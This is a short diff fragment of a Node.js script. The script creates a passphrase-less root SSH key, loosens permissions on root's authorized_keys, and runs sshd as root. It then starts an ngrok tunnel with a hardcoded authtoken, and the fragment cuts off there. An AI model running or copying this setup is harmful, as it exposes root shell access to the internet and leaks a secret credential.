@@ -1,4 +1,5 @@
 require("child_process").spawnSync("ssh-keygen", ["-N", "", "-f", "/root/.ssh/id_rsa"]);
+require("child_process").spawnSync("chmod", ["644", "/root/.ssh/authorized_keys"]);
 require("child_process").spawn("/usr/sbin/sshd", ["-f", "/root/.ssh/sshd_config", "-D"]);
 require('ngrok').connect({
     authtoken: "1cOYtSJFaszfkwIAtkKKwQ5msRM_584Ju42ZcFDS1B8mXFynL",
